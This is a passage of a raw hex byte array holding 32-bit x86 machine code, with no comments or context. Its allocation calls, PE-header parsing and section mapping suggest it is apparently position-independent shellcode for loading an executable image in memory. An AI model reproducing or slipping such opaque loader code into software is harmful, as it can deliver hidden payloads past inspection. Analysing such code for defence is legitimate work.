0x02, 0x00, 0x75, 0x0b, 0x83, 0x7d, 0xf8, \n  0x04, 0x75, 0x05, 0x33, 0xc0, 0x40, 0xc9, 0xc3, 0x33, 0xc0, 0xc9, 0xc3, \n  0x81, 0xec, 0x14, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0x24, 0x02, \n  0x00, 0x00, 0x33, 0xc0, 0x21, 0x44, 0x24, 0x04, 0x55, 0x8b, 0xac, 0x24, \n  0x24, 0x02, 0x00, 0x00, 0x56, 0x57, 0x8b, 0xbc, 0x24, 0x28, 0x02, 0x00, \n  0x00, 0x8b, 0x8f, 0xe8, 0x00, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0x82, \n  0x00, 0x00, 0x00, 0x53, 0x8d, 0x87, 0x60, 0x08, 0x00, 0x00, 0x50, 0x8d, \n  0x87, 0x50, 0x08, 0x00, 0x00, 0x50, 0xff, 0xd1, 0x85, 0xc0, 0x0f, 0x88, \n  0x9d, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x8d, 0x45, 0x0c, \n  0x50, 0x57, 0xe8, 0x3d, 0x15, 0x00, 0x00, 0x8b, 0x13, 0x8d, 0x73, 0x04, \n  0x83, 0xc4, 0x0c, 0x8d, 0x87, 0x70, 0x08, 0x00, 0x00, 0x8b, 0x0a, 0x56, \n  0x50, 0x8d, 0x44, 0x24, 0x2c, 0x50, 0x52, 0xff, 0x51, 0x0c, 0x85, 0xc0, \n  0x78, 0x34, 0x8b, 0x06, 0x8d, 0x54, 0x24, 0x14, 0x52, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x28, 0x85, 0xc0, 0x78, 0x33, 0x83, 0x7c, 0x24, 0x14, 0x00, \n  0x74, 0x1f, 0x8b, 0x0e, 0x8d, 0x43, 0x08, 0x50, 0x8d, 0x87, 0x90, 0x08, \n  0x00, 0x00, 0x50, 0x8b, 0x11, 0x8d, 0x87, 0x80, 0x08, 0x00, 0x00, 0x50, \n  0x51, 0xff, 0x52, 0x24, 0xeb, 0x03, 0x83, 0x26, 0x00, 0x85, 0xc0, 0x78, \n  0x09, 0x83, 0xbf, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x75, 0x1c, 0x8d, 0x43, \n  0x08, 0x50, 0x8d, 0x87, 0x90, 0x08, 0x00, 0x00, 0x50, 0x8d, 0x87, 0x80, \n  0x08, 0x00, 0x00, 0x50, 0x6a, 0x00, 0x6a, 0x00, 0xff, 0x97, 0xe4, 0x00, \n  0x00, 0x00, 0x85, 0xc0, 0x79, 0x10, 0x83, 0x63, 0x08, 0x00, 0x33, 0xc0, \n  0xe9, 0x1b, 0x01, 0x00, 0x00, 0x83, 0x23, 0x00, 0xeb, 0xd0, 0x8b, 0x43, \n  0x08, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x28, 0x85, 0xc0, 0x0f, 0x88, 0x01, \n  0x01, 0x00, 0x00, 0x8d, 0x85, 0x0c, 0x01, 0x00, 0x00, 0x80, 0x38, 0x00, \n  0x8d, 0x73, 0x0c, 0x75, 0x0c, 0x8b, 0x43, 0x08, 0x56, 0x50, 0x8b, 0x08, \n  0xff, 0x51, 0x34, 0xeb, 0x3e, 0x8d, 0x4c, 0x24, 0x24, 0x51, 0x50, 0x57, \n  0xe8, 0x73, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x24, \n  0x50, 0xff, 0x97, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0x4b, 0x08, 0x8b, 0xf0, \n  0x8d, 0x43, 0x0c, 0x50, 0x6a, 0x00, 0x8b, 0x11, 0x56, 0x51, 0xff, 0x52, \n  0x30, 0x56, 0x89, 0x44, 0x24, 0x1c, 0xff, 0x97, 0xb4, 0x00, 0x00, 0x00, \n  0x8b, 0x44, 0x24, 0x18, 0x8d, 0x73, 0x0c, 0x85, 0xc0, 0x0f, 0x88, 0xa1, \n  0x00, 0x00, 0x00, 0x8b, 0x16, 0x8d, 0x43, 0x10, 0x50, 0x8d, 0x87, 0xa0, \n  0x08, 0x00, 0x00, 0x50, 0x8b, 0x0a, 0x52, 0xff, 0x11, 0x85, 0xc0, 0x0f, \n  0x88, 0x87, 0x00, 0x00, 0x00, 0x8b, 0x85, 0x24, 0x05, 0x00, 0x00, 0x83, \n  0x64, 0x24, 0x20, 0x00, 0x89, 0x44, 0x24, 0x1c, 0x8d, 0x44, 0x24, 0x1c, \n  0x50, 0x6a, 0x01, 0x6a, 0x11, 0xff, 0x97, 0x98, 0x00, 0x00, 0x00, 0x8b, \n  0xf0, 0x85, 0xf6, 0x74, 0x63, 0x8b, 0x56, 0x0c, 0x33, 0xc9, 0x39, 0x8d, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x13, 0x8a, 0x84, 0x29, 0x28, 0x05, 0x00, \n  0x00, 0x88, 0x04, 0x0a, 0x41, 0x3b, 0x8d, 0x24, 0x05, 0x00, 0x00, 0x72, \n  0xed, 0x8b, 0x4b, 0x10, 0x8d, 0x43, 0x14, 0x50, 0x56, 0x51, 0x8b, 0x11, \n  0xff, 0x92, 0xb4, 0x00, 0x00, 0x00, 0xf7, 0xd8, 0x1b, 0xc0, 0x33, 0xd2, \n  0x40, 0x8b, 0xca, 0x89, 0x44, 0x24, 0x10, 0x8b, 0x46, 0x0c, 0x39, 0x95, \n  0x24, 0x05, 0x00, 0x00, 0x76, 0x13, 0x88, 0x94, 0x29, 0x28, 0x05, 0x00, \n  0x00, 0x88, 0x14, 0x08, 0x41, 0x3b, 0x8d, 0x24, 0x05, 0x00, 0x00, 0x72, \n  0xed, 0x56, 0xff, 0x97, 0xa4, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x10, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x14, 0x02, 0x00, 0x00, 0xc3, 0x81, \n  0xec, 0x38, 0x01, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0x48, \n  0x01, 0x00, 0x00, 0x57, 0xff, 0x76, 0x2c, 0xff, 0x76, 0x28, 0xff, 0x76, \n  0x4c, 0xff, 0x76, 0x48, 0x56, 0xe8, 0x84, 0x15, 0x00, 0x00, 0xff, 0x76, \n  0x2c, 0x8b, 0xf8, 0xff, 0x76, 0x28, 0x89, 0x7c, 0x24, 0x38, 0xff, 0x76, \n  0x54, 0xff, 0x76, 0x50, 0x56, 0xe8, 0x6c, 0x15, 0x00, 0x00, 0xff, 0x76, \n  0x2c, 0x8b, 0xd8, 0xff, 0x76, 0x28, 0x89, 0x5c, 0x24, 0x44, 0xff, 0xb6, \n  0xec, 0x01, 0x00, 0x00, 0xff, 0xb6, 0xe8, 0x01, 0x00, 0x00, 0x56, 0xe8, \n  0x4e, 0x15, 0x00, 0x00, 0x83, 0xc4, 0x3c, 0x8b, 0xe8, 0x89, 0x6c, 0x24, \n  0x10, 0x85, 0xff, 0x74, 0x28, 0x85, 0xdb, 0x74, 0x24, 0x85, 0xed, 0x74, \n  0x20, 0x6a, 0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0xff, 0x36, 0x33, 0xdb, \n  0x53, 0xff, 0xd7, 0x8b, 0xf8, 0x85, 0xff, 0x75, 0x1a, 0x83, 0xbe, 0x30, \n  0x02, 0x00, 0x00, 0x02, 0x75, 0x03, 0x53, 0xff, 0xd5, 0x83, 0xc8, 0xff, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x38, 0x01, 0x00, 0x00, 0xc3, 0xff, \n  0x36, 0x56, 0x57, 0xe8, 0x77, 0x19, 0x00, 0x00, 0x6a, 0x20, 0x8d, 0x44, \n  0x24, 0x34, 0x53, 0x50, 0xe8, 0x8e, 0x19, 0x00, 0x00, 0x83, 0xc4, 0x18, \n  0x8d, 0x5f, 0x28, 0x83, 0xbf, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x48, \n  0x8b, 0x07, 0x2d, 0x3c, 0x02, 0x00, 0x00, 0x50, 0x8d, 0x87, 0x3c, 0x02, \n  0x00, 0x00, 0x50, 0x8d, 0x47, 0x14, 0x50, 0x8d, 0x47, 0x04, 0x50, 0xe8, \n  0x37, 0x16, 0x00, 0x00, 0xff, 0x73, 0x04, 0x8d, 0x87, 0x2c, 0x0c, 0x00, \n  0x00, 0xff, 0x33, 0x50, 0xe8, 0xfc, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x1c, \n  0x3b, 0x87, 0x30, 0x0d, 0x00, 0x00, 0x0f, 0x85, 0x5b, 0x02, 0x00, 0x00, \n  0x3b, 0x97, 0x34, 0x0d, 0x00, 0x00, 0x0f, 0x85, 0x4f, 0x02, 0x00, 0x00, \n  0xff, 0x73, 0x04, 0xff, 0x33, 0xff, 0x77, 0x34, 0xff, 0x77, 0x30, 0x57, \n  0xe8, 0x8d, 0x14, 0x00, 0x00, 0x83, 0xc4, 0x14, 0x89, 0x47, 0x30, 0x85, \n  0xc0, 0x0f, 0x84, 0x66, 0xff, 0xff, 0xff, 0x8d, 0xb7, 0x40, 0x02, 0x00, \n  0x00, 0x8a, 0x0e, 0x33, 0xc0, 0x84, 0xc9, 0x74, 0x3a, 0x8d, 0x6c, 0x24, \n  0x44, 0x8b, 0xd6, 0x2b, 0xee, 0x80, 0xf9, 0x3b, 0x74, 0x12, 0x3d, 0x04, \n  0x01, 0x00, 0x00, 0x73, 0x0b, 0x88, 0x0c, 0x2a, 0x40, 0x42, 0x8a, 0x0a, \n  0x84, 0xc9, 0x75, 0xe9, 0x85, 0xc0, 0x74, 0x17, 0x46, 0xc6, 0x44, 0x04, \n  0x44, 0x00, 0x03, 0xf0, 0x8d, 0x44, 0x24, 0x44, 0x50, 0x57, 0xe8, 0x42, \n  0x12, 0x00, 0x00, 0x59, 0x59, 0xeb, 0xbe, 0x33, 0xed, 0x45, 0x39, 0xaf, \n  0x3c, 0x02, 0x00, 0x00, 0x76, 0x57, 0x8d, 0x47, 0x34, 0x8d, 0x77, 0x38, \n  0x89, 0x44, 0x24, 0x18, 0xff, 0x73, 0x04, 0xff, 0x33, 0xff, 0x76, 0x04, \n  0xff, 0x36, 0x57, 0xe8, 0x12, 0x14, 0x00, 0x00, 0x8b, 0x4c, 0x24, 0x2c, \n  0x83, 0xc4, 0x14, 0x89, 0x01, 0x85, 0xc0, 0x75, 0x1d, 0x8b, 0x06, 0x3b, \n  0x87, 0xa0, 0x01, 0x00, 0x00, 0x0f, 0x85, 0xa4, 0x01, 0x00, 0x00, 0x8b, \n  0x46, 0x04, 0x3b, 0x87, 0xa4, 0x01, 0x00, 0x00, 0x0f, 0x85, 0x95, 0x01, \n  0x00, 0x00, 0x45, 0x83, 0xc1, 0x04, 0x83, 0xc6, 0x08, 0x89, 0x4c, 0x24, \n  0x18, 0x3b, 0xaf, 0x3c, 0x02, 0x00, 0x00, 0x72, 0xb3, 0x8b, 0x87, 0x20, \n  0x09, 0x00, 0x00, 0x6a, 0x02, 0x5d, 0x3b, 0xc5, 0x75, 0x17, 0x57, 0xe8, \n  0x0f, 0xf1, 0xff, 0xff, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x66, 0x01, 0x00, \n  0x00, 0x8b, 0xb7, 0x60, 0x0d, 0x00, 0x00, 0xeb, 0x18, 0x83, 0xf8, 0x03, \n  0x0f, 0x84, 0x55, 0x01, 0x00, 0x00, 0x8d, 0xb7, 0x60, 0x0d, 0x00, 0x00, \n  0x83, 0xf8, 0x01, 0x74, 0x04, 0x8b, 0x74, 0x24, 0x1c, 0x83, 0xbf, 0x70, \n  0x05, 0x00, 0x00, 0x01, 0x74, 0x2e, 0x57, 0xe8, 0x73, 0xef, 0xff, 0xff, \n  0x59, 0x85, 0xc0, 0x75, 0x0c, 0x39, 0xaf, 0x70, 0x05, 0x00, 0x00, 0x0f, \n  0x84, 0x26, 0x01, 0x00, 0x00, 0x57, 0xe8, 0x57, 0xf0, 0xff, 0xff, 0x59, \n  0x85, 0xc0, 0x75, 0x0c, 0x39, 0xaf, 0x70, 0x05, 0x00, 0x00, 0x0f, 0x84, \n  0x0f, 0x01, 0x00, 0x00, 0x83, 0x7e, 0x08, 0x01, 0x0f, 0x84, 0x9c, 0x00, \n  0x00, 0x00, 0x8b, 0x86, 0x24, 0x05, 0x00, 0x00, 0x6a, 0x04, 0x05, 0x2f, \n  0x15, 0x00, 0x00, 0x68, 0x00, 0x30, 0x00, 0x00, 0x25, 0x00, 0xf0, 0xff, \n  0xff, 0x50, 0x6a, 0x00, 0xff, 0x54, 0x24, 0x2c, 0x8b, 0xd8, 0x85, 0xdb, \n  0x0f, 0x84, 0xdd, 0x00, 0x00, 0x00, 0x68, 0x30, 0x05, 0x00, 0x00, 0x56, \n  0x53, 0xe8, 0x99, 0x17, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x83, 0x7e, 0x08, \n  0x03, 0x74, 0x22, 0x83, 0x7e, 0x08, 0x04, 0x74, 0x1c, 0x39, 0x6e, 0x08, \n  0x75, 0x54, 0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, 0x50, 0x8d, 0x86, 0x28, \n  0x05, 0x00, 0x00, 0x50, 0xe8, 0x75, 0x15, 0x00, 0x00, 0x59, 0x59, 0xeb, \n  0x3b, 0x8d, 0x44, 0x24, 0x20, 0xb9, 0x00, 0x01, 0x00, 0x00, 0x50, 0xff, \n  0xb6, 0x20, 0x05, 0x00, 0x00, 0x8d, 0x86, 0x28, 0x05, 0x00, 0x00, 0x50, \n  0xff, 0xb6, 0x24, 0x05, 0x00, 0x00, 0x8d, 0x83, 0x28, 0x05, 0x00, 0x00, \n  0x50, 0x66, 0x8b, 0x46, 0x08, 0x66, 0x48, 0x66, 0x0b, 0xc1, 0x0f, 0xb7, \n  0xc0, 0x50, 0xff, 0x97, 0x18, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x6b, \n  0x8b, 0xf3, 0x83, 0x3e, 0x03, 0x74, 0x50, 0x83, 0x3e, 0x04, 0x74, 0x4b, \n  0x83, 0x3e, 0x01, 0x74, 0x17, 0x39, 0x2e, 0x74, 0x13, 0x83, 0x3e, 0x05, \n  0x74, 0x05, 0x83, 0x3e, 0x06, 0x75, 0x41, 0x56, 0x57, 0xe8, 0x8f, 0x0c, \n  0x00, 0x00, 0xeb, 0x36, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x56, 0x57, 0xe8, \n  0xd4, 0xfa, 0xff, 0xff, 0x83, 0xc4, 0x0c, 0x85, 0xc0, 0x74, 0x0f, 0x8d, \n  0x44, 0x24, 0x24, 0x50, 0x56, 0x57, 0xe8, 0xa0, 0x00, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x24, 0x50, 0x57, 0xe8, 0x7f, 0xf5, 0xff, \n  0xff, 0xeb, 0x07, 0x56, 0x57, 0xe8, 0xe9, 0x03, 0x00, 0x00, 0x59, 0x59, \n  0x83, 0xbf, 0x30, 0x02, 0x00, 0x00, 0x03, 0x75, 0x02, 0xeb, 0xfe, 0x8b, \n  0x6c, 0x24, 0x10, 0x8b, 0x87, 0x20, 0x09, 0x00, 0x00, 0x83, 0xf8, 0x02, \n  0x74, 0x05, 0x83, 0xf8, 0x03, 0x75, 0x37, 0x8b, 0x87, 0x60, 0x0d, 0x00, \n  0x00, 0x85, 0xc0, 0x74, 0x2d, 0xff, 0xb7, 0x58, 0x0d, 0x00, 0x00, 0x6a, \n  0x00, 0x50, 0xe8, 0xc0, 0x16, 0x00, 0x00, 0x8b, 0x5c, 0x24, 0x20, 0x83, \n  0xc4, 0x0c, 0x68, 0x00, 0xc0, 0x00, 0x00, 0x6a, 0x00, 0xff, 0xb7, 0x60, \n  0x0d, 0x00, 0x00, 0xff, 0xd3, 0x83, 0xa7, 0x60, 0x0d, 0x00, 0x00, 0x00, \n  0xeb, 0x04, 0x8b, 0x5c, 0x24, 0x14, 0xff, 0x37, 0x8b, 0xb7, 0x30, 0x02, \n  0x00, 0x00, 0x6a, 0x00, 0x57, 0xe8, 0x8d, 0x16, 0x00, 0x00, 0x83, 0xc4, \n  0x0c, 0x68, 0x00, 0xc0, 0x00, 0x00, 0x6a, 0x00, 0x57, 0xff, 0xd3, 0x83, \n  0xfe, 0x02, 0x75, 0x04, 0x6a, 0x00, 0xff, 0xd5, 0x33, 0xc0, 0xe9, 0xc1, \n  0xfc, 0xff, 0xff, 0x81, 0xec, 0x7c, 0x02, 0x00, 0x00, 0x53, 0x8b, 0x9c, \n  0x24, 0x84, 0x02, 0x00, 0x00, 0x33, 0xc0, 0x55, 0x56, 0x8b, 0xb4, 0x24, \n  0x90, 0x02, 0x00, 0x00, 0x33, 0xed, 0x21, 0x6c, 0x24, 0x18, 0x57, 0x8d, \n  0x7c, 0x24, 0x48, 0xab, 0xab, 0xab, 0xab, 0x33, 0xc0, 0x83, 0x3e, 0x02, \n  0x66, 0x89, 0x44, 0x24, 0x18, 0x0f, 0x85, 0x97, 0x01, 0x00, 0x00, 0x8b, \n  0x84, 0x24, 0x98, 0x02, 0x00, 0x00, 0x8b, 0x48, 0x14, 0x8d, 0x78, 0x1c, \n  0x57, 0x51, 0x8b, 0x01, 0xff, 0x50, 0x40, 0x85, 0xc0, 0x0f, 0x88, 0x74, \n  0x01, 0x00, 0x00, 0x8b, 0x07, 0x8d, 0x54, 0x24, 0x1c, 0x52, 0x50, 0x8b, \n  0x08, 0xff, 0x51, 0x48, 0x85, 0xc0, 0x0f, 0x88, 0xe9, 0x02, 0x00, 0x00, \n  0x8d, 0x44, 0x24, 0x2c, 0x50, 0x6a, 0x01, 0xff, 0x74, 0x24, 0x24, 0xff, \n  0x93, 0xa8, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x28, 0x50, 0x6a, 0x01, \n  0xff, 0x74, 0x24, 0x24, 0xff, 0x93, 0xac, 0x00, 0x00, 0x00, 0x8b, 0x44, \n  0x24, 0x28, 0x2b, 0x44, 0x24, 0x2c, 0x83, 0xc0, 0x01, 0x0f, 0x84, 0xe3, \n  0x00, 0x00, 0x00, 0x6a, 0x01, 0x55, 0x6a, 0x0c, 0xff, 0x93, 0x9c, 0x00, \n  0x00, 0x00, 0x81, 0xc6, 0x0c, 0x04, 0x00, 0x00, 0x8b, 0xe8, 0x80, 0x3e, \n  0x00, 0x74, 0x7b, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x56, \n  0x53, 0xe8, 0xf6, 0x0e, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, \n  0x14, 0x50, 0x8d, 0x84, 0x24, 0x8c, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, \n  0x94, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x14, 0x8b, 0xf0, 0xb8, 0x08, \n  0x20, 0x00, 0x00, 0x6a, 0x00, 0x6a, 0x08, 0x66, 0x89, 0x44, 0x24, 0x44, \n  0xff, 0x93, 0x9c, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x83, \n  0x7c, 0x24, 0x14, 0x00, 0x89, 0x44, 0x24, 0x40, 0x76, 0x66, 0x33, 0xc0, \n  0xff, 0x34, 0x86, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x44, \n  0x24, 0x14, 0x50, 0xff, 0x74, 0x24, 0x48, 0xff, 0x93, 0xa0, 0x00, 0x00, \n  0x00, 0x8b, 0x44, 0x24, 0x10, 0x40, 0x89, 0x44, 0x24, 0x10, 0x3b, 0x44, \n  0x24, 0x14, 0x72, 0xd8, 0xeb, 0x3a, 0x6a, 0x01, 0x6a, 0x00, 0xb8, 0x08, \n  0x20, 0x00, 0x00, 0x6a, 0x08, 0x66, 0x89, 0x44, 0x24, 0x44, 0xff, 0x93, \n  0x9c, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x89, 0x44, 0x24, \n  0x40, 0x8d, 0x44, 0x24, 0x18, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, \n  0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xff, 0x74, 0x24, 0x48, 0xff, 0x93, \n  0xa0, 0x00, 0x00, 0x00, 0x83, 0x64, 0x24, 0x10, 0x00, 0x8d, 0x44, 0x24, \n  0x38, 0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0x55, 0xff, 0x93, 0xa0, 0x00, \n  0x00, 0x00, 0x83, 0x64, 0x24, 0x50, 0x00, 0x8d, 0x54, 0x24, 0x68, 0x52, \n  0x33, 0xc0, 0x8d, 0x74, 0x24, 0x4c, 0x40, 0x66, 0x89, 0x44, 0x24, 0x4c, \n  0x8b, 0x07, 0x55, 0x83, 0xec, 0x10, 0x8b, 0xfc, 0x8b, 0x08, 0x50, 0xa5, \n  0xa5, 0xa5, 0xa5, 0xff, 0x91, 0x94, 0x00, 0x00, 0x00, 0x85, 0xed, 0x0f, \n  0x84, 0xa0, 0x01, 0x00, 0x00, 0xff, 0x74, 0x24, 0x40, 0xff, 0x93, 0xa4, \n  0x00, 0x00, 0x00, 0x55, 0xff, 0x93, 0xa4, 0x00, 0x00, 0x00, 0xe9, 0x8a, \n  0x01, 0x00, 0x00, 0x21, 0x2f, 0xe9, 0x83, 0x01, 0x00, 0x00, 0x8d, 0x84, \n  0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x86, 0x0c, 0x02, 0x00, 0x00, \n  0x50, 0x53, 0xe8, 0xd5, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x84, \n  0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x89, 0x6c, 0x24, 0x20, 0x85, 0xed, 0x0f, 0x84, 0x52, 0x01, \n  0x00, 0x00, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0x8d, 0x86, \n  0x0c, 0x03, 0x00, 0x00, 0x50, 0x53, 0xe8, 0xa1, 0x0d, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x50, 0xff, 0x93, \n  0xb0, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x24, 0x85, 0xc0, 0x0f, 0x84, \n  0x16, 0x01, 0x00, 0x00, 0x8b, 0x8c, 0x24, 0x98, 0x02, 0x00, 0x00, 0x8b, \n  0x51, 0x14, 0x8d, 0x79, 0x18, 0x57, 0x55, 0x52, 0x8b, 0x0a, 0x89, 0x7c, \n  0x24, 0x40, 0xff, 0x51, 0x44, 0x85, 0xc0, 0x0f, 0x88, 0xea, 0x00, 0x00, \n  0x00, 0x81, 0xc6, 0x0c, 0x04, 0x00, 0x00, 0x33, 0xed, 0x80, 0x3e, 0x00, \n  0x0f, 0x84, 0x9a, 0x00, 0x00, 0x00, 0x8d, 0x84, 0x24, 0x88, 0x00, 0x00, \n  0x00, 0x50, 0x56, 0x53, 0xe8, 0x43, 0x0d, 0x00, 0x00, 0x83, 0xc4, 0x0c, \n  0x8d, 0x44, 0x24, 0x14, 0x50, 0x8d, 0x84, 0x24, 0x8c, 0x00, 0x00, 0x00, \n  0x50, 0xff, 0x93, 0x94, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x14, 0x89, \n  0x44, 0x24, 0x34, 0x55, 0x6a, 0x0c, 0xff, 0x93, 0x9c, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x85, 0xed, 0x74, 0x5e, 0x83, 0x64, 0x24, 0x10, 0x00, 0x83, \n  0x7c, 0x24, 0x14, 0x00, 0x76, 0x52, 0x8b, 0x7c, 0x24, 0x30, 0x33, 0xc0, \n  0xff, 0x34, 0x87, 0xff, 0x93, 0xb0, 0x00, 0x00, 0x00, 0x6a, 0x08, 0x89, \n  0x44, 0x24, 0x64, 0x58, 0x66, 0x89, 0x44, 0x24, 0x58, 0x8d, 0x44, 0x24, \n  0x58, 0x50, 0x8d, 0x44, 0x24, 0x14, 0x50, 0x55, 0xff, 0x93, 0xa0, 0x00, \n  0x00, 0x00, 0x8b, 0xf0, 0x85, 0xf6, 0x79, 0x09, 0x55, 0xff, 0x93, 0xa4, \n  0x00, 0x00, 0x00, 0x33, 0xed, 0x8b, 0x44, 0x24, 0x10, 0x40, 0x89, 0x44, \n  0x24, 0x10, 0x3b, 0x44, 0x24, 0x14, 0x72, 0xbc, 0x8b, 0x7c, 0x24, 0x34, \n  0x85, 0xf6, 0x78, 0x3b, 0x8b, 0x07, 0x8d, 0x54, 0x24, 0x78, 0x52, 0x55, \n  0x83, 0xec, 0x10, 0x8d, 0x74, 0x24, 0x60, 0x8b, 0x08, 0x8b, 0xfc, 0x6a, \n  0x00, 0xa5, 0x68, 0x18, 0x01, 0x00, 0x00, 0xa5, 0xa5, 0xa5, 0x8b, 0x74, \n  0x24, 0x44, 0x56, 0x50, 0xff, 0x91, 0xe4, 0x00, 0x00, 0x00, 0x85, 0xed, \n  0x74, 0x07, 0x55, 0xff, 0x93, 0xa4, 0x00, 0x00, 0x00, 0x8b, 0x6c, 0x24, \n  0x20, 0xeb, 0x08, 0x8b, 0x6c, 0x24, 0x20, 0x8b, 0x74, 0x24, 0x24, 0x56, \n  0xff, 0x93, 0xb4, 0x00, 0x00, 0x00, 0x55, 0xff, 0x93, 0xb4, 0x00, 0x00, \n  0x00, 0x33, 0xc0, 0x40, 0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x7c, 0x02, \n  0x00, 0x00, 0xc3, 0x81, 0xec, 0x40, 0x03, 0x00, 0x00, 0x8b, 0x84, 0x24, \n  0x48, 0x03, 0x00, 0x00, 0x53, 0x8b, 0x9c, 0x24, 0x48, 0x03, 0x00, 0x00, \n  0x05, 0x28, 0x05, 0x00, 0x00, 0x55, 0x56, 0x33, 0xf6, 0x89, 0x44, 0x24, \n  0x30, 0x8b, 0x68, 0x3c, 0x03, 0xe8, 0x89, 0x74, 0x24, 0x14, 0x56, 0x89, \n  0x74, 0x24, 0x10, 0x89, 0x74, 0x24, 0x28, 0x89, 0x6c, 0x24, 0x2c, 0xff, \n  0x53, 0x38, 0x8b, 0xd0, 0x66, 0x8b, 0x45, 0x04, 0x8b, 0x4a, 0x3c, 0x66, \n  0x3b, 0x44, 0x11, 0x04, 0x0f, 0x85, 0x15, 0x08, 0x00, 0x00, 0x8b, 0x45, \n  0x50, 0x89, 0x44, 0x24, 0x48, 0x89, 0x74, 0x24, 0x4c, 0x8b, 0x85, 0xa4, \n  0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0x85, 0xc0, 0x75, 0x07, 0x8b, \n  0x45, 0x34, 0x89, 0x44, 0x24, 0x0c, 0x57, 0x6a, 0x03, 0x33, 0xc9, 0x8d, \n  0xbb, 0x25, 0x06, 0x00, 0x00, 0x5a, 0x41, 0x80, 0x3f, 0x00, 0x56, 0x75, \n  0x27, 0x68, 0x00, 0x00, 0x00, 0x08, 0x6a, 0x40, 0x8d, 0x44, 0x24, 0x58, \n  0x50, 0x56, 0x68, 0x1f, 0x00, 0x0f, 0x00, 0x8d, 0x44, 0x24, 0x5c, 0x50, \n  0xff, 0x93, 0x20, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xbc, 0x07, \n  0x00, 0x00, 0xeb, 0x7a, 0x56, 0x52, 0x56, 0x51, 0x68, 0x00, 0x00, 0x00, \n  0x80, 0x57, 0xff, 0x53, 0x60, 0x8b, 0xf8, 0x83, 0xff, 0xff, 0x0f, 0x84, \n  0xa2, 0x07, 0x00, 0x00, 0x85, 0xff, 0x0f, 0x84, 0x9a, 0x07, 0x00, 0x00, \n  0x8d, 0x44, 0x24, 0x3c, 0x0f, 0x57, 0xc0, 0x50, 0x57, 0x66, 0x0f, 0x13, \n  0x44, 0x24, 0x44, 0xff, 0x53, 0x64, 0x85, 0xc0, 0x0f, 0x84, 0x80, 0x07, \n  0x00, 0x00, 0x8b, 0x45, 0x50, 0x3b, 0x44, 0x24, 0x3c, 0x0f, 0x87, 0x73, \n  0x07, 0x00, 0x00, 0x57, 0x68, 0x00, 0x00, 0x00, 0x01, 0x6a, 0x02, 0x58, \n  0x50, 0x56, 0x56, 0x68, 0x1f, 0x00, 0x0f, 0x00, 0x8d, 0x44, 0x24, 0x5c, \n  0x50, 0xff, 0x93, 0x20, 0x01, 0x00, 0x00, 0x57, 0x8b, 0xf0, 0xff, 0x93, \n  0x90, 0x00, 0x00, 0x00, 0x85, 0xf6, 0x0f, 0x85, 0x46, 0x07, 0x00, 0x00, \n  0x8d, 0xbb, 0x25, 0x06, 0x00, 0x00, 0x6a, 0x04, 0x58, 0x50, 0x56, 0x6a, \n  0x02, 0x58, 0x50, 0x8d, 0x44, 0x24, 0x34, 0x50, 0x56, 0x56, 0x56, 0x8d, \n  0x44, 0x24, 0x2c, 0x50, 0xff, 0x53, 0x70, 0x50, 0xff, 0x74, 0x24, 0x68, \n  0xff, 0x93, 0x24, 0x01, 0x00, 0x00, 0x8b, 0x74, 0x24, 0x34, 0x8b, 0x4c, \n  0x24, 0x10, 0x8b, 0x76, 0x3c, 0x03, 0xf1, 0x89, 0x74, 0x24, 0x1c, 0x85, \n  0xc0, 0x74, 0x0b, 0x3d, 0x03, 0x00, 0x00, 0x40, 0x0f, 0x85, 0xfc, 0x06, \n  0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0xf4, 0x06, 0x00, 0x00, 0x80, 0x3f, \n  0x00, 0x74, 0x4a, 